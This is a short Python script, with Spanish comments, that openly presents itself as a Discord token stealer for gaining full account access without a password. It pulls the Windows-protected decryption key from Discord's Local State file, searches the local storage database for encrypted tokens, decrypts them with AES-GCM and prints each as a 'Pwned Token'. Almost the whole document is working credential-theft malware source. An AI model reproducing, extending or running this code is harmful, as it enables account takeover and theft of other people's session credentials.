#!/usr/bin/env python3
# https://github.com/wvverez
# Stealer para Tokens Discord para conseguir acceso completo a una cuenta de discord sin pass

import os
import re
import json
import base64
import win32crypt
from Crypto.Cipher import AES

def get_tokens():
    # Aquí defino la ruta de Discord en Windows
    roaming = os.getenv('APPDATA')
    paths = [os.path.join(roaming, x) for x in ["Discord", "discordcanary", "discordptb"]]
    
    tokens = []
    
    for path in paths:
        if not os.path.exists(path):
            continue
        
        # el archivo con la clave de cifrado
        local_state = os.path.join(path, "Local State")
        # la carpeta donde Discord guarda los datos
        leveldb = os.path.join(path, "Local Storage", "leveldb")
        
        if not os.path.exists(local_state) or not os.path.exists(leveldb):
            continue
        
        # Consigo la clave maestra de Windows
        try:
            with open(local_state, 'r', encoding='utf-8', errors='ignore') as f:
                key = base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:]
                key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except:
            continue
        
        # Buscó en archivos de leveldb
        for file in os.listdir(leveldb):
            if not file.endswith(('.ldb', '.log')):
                continue
            
            with open(os.path.join(leveldb, file), 'r', encoding='utf-8', errors='ignore') as f:
                # Buscó tokens cifrados en formato moderno de versiones de Discord
                for match in re.findall(r'dQw4w9WgXcQ:[^\s"\']+', f.read()):
                    try:
                        # Lo decodificó y descifró con AES-GCM
                        buff = base64.b64decode(match.split(':')[1])
                        token = AES.new(key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
                        if token and token not in tokens:
                            tokens.append(token)
                            print("[+] Pwned Token: " + token)
                    except:
                        pass
    
    return tokens

if __name__ == "__main__":
    get_tokens()
